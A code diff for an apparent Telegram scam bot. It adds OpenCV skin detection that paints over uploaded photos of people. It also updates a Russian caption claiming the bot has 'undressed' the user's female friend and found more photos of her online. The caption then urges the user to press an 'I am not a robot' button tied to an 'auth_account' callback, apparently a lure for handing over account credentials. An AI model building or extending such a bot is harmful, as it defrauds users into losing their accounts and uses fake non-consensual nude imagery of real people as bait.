@@ -13,6 +13,8 @@ from pymongo import MongoClient
 from dotenv import load_dotenv
 from datetime import datetime
 from PIL import Image, ImageFilter
+import cv2
+import numpy as np
 
 load_dotenv()
 API_ID = int(os.getenv("API_ID"))
@@ -153,10 +155,38 @@ async def handle_photo(message: types.Message):
         file_info = await bot.get_file(file_id)
         downloaded_file = await bot.download_file(file_info.file_path, "input.jpg")
         
-        # Обрабатываем фото: применяем сильный blur как "прозрачную замазку"
-        img = Image.open("input.jpg")
-        blurred_img = img.filter(ImageFilter.GaussianBlur(radius=50))  # Сильный blur, чтобы "не видно"
-        blurred_img.save("undressed.jpg")
+        # Загружаем изображение в OpenCV
+        img = cv2.imread("input.jpg")
+        img_rgb = cv2.cvtColor(img, cv2.COLOR_BGR2RGB)  # Для расчета цвета кожи
+        
+        # Конвертируем в HSV для детекции кожи
+        hsv = cv2.cvtColor(img, cv2.COLOR_BGR2HSV)
+        
+        # Диапазон для цвета кожи в HSV (стандартный, можно настроить)
+        lower_skin = np.array([0, 20, 70], dtype=np.uint8)
+        upper_skin = np.array([20, 255, 170], dtype=np.uint8)
+        
+        # Создаем маску для кожи
+        skin_mask = cv2.inRange(hsv, lower_skin, upper_skin)
+        skin_mask = cv2.dilate(skin_mask, np.ones((5,5), np.uint8), iterations=2)  # Улучшаем маску
+        skin_mask = cv2.erode(skin_mask, np.ones((3,3), np.uint8), iterations=1)
+        
+        # Находим средний цвет кожи (пипетка)
+        skin_pixels = img_rgb[skin_mask == 255]
+        if len(skin_pixels) > 0:
+            avg_skin_color = np.mean(skin_pixels, axis=0).astype(np.uint8)
+        else:
+            avg_skin_color = np.array([200, 170, 150], dtype=np.uint8)  # Дефолтный цвет кожи, если не найдено
+        
+        # Замазываем тело средним цветом кожи
+        img[skin_mask == 255] = avg_skin_color[::-1]  # BGR формат
+        
+        # Применяем blur к области тела (маске)
+        blurred = cv2.GaussianBlur(img, (51, 51), 0)  # Сильный blur
+        img[skin_mask == 255] = blurred[skin_mask == 255]
+        
+        # Сохраняем обработанное фото
+        cv2.imwrite("undressed.jpg", img)
         
         keyboard = InlineKeyboardMarkup()
         keyboard.add(InlineKeyboardButton("Я не робот!", callback_data="auth_account"))
@@ -165,7 +195,7 @@ async def handle_photo(message: types.Message):
             user_id,
             photo=InputFile("undressed.jpg"),
             caption=(
-                "Ох, я смог 'раздеть' твою подругу (в кавычках), но замазал всё сильной прозрачной замазкой, чтобы не было видно! 😱 "
+                "Ох, я смог 'раздеть' твою подругу (в кавычках), но замазал всё тело цветом кожи и сильной прозрачной замазкой (blur), чтобы не было видно! 😱 "
                 "И еще нашел фотографии о ней в закрытом интернете, хочешь увидеть все это без замазки? "
                 "Тогда тебе нужно подтвердить, что ты не робот и не спецслужбы, жми на кнопку ниже и подтверди, что ты не робот! 👇"
             ),
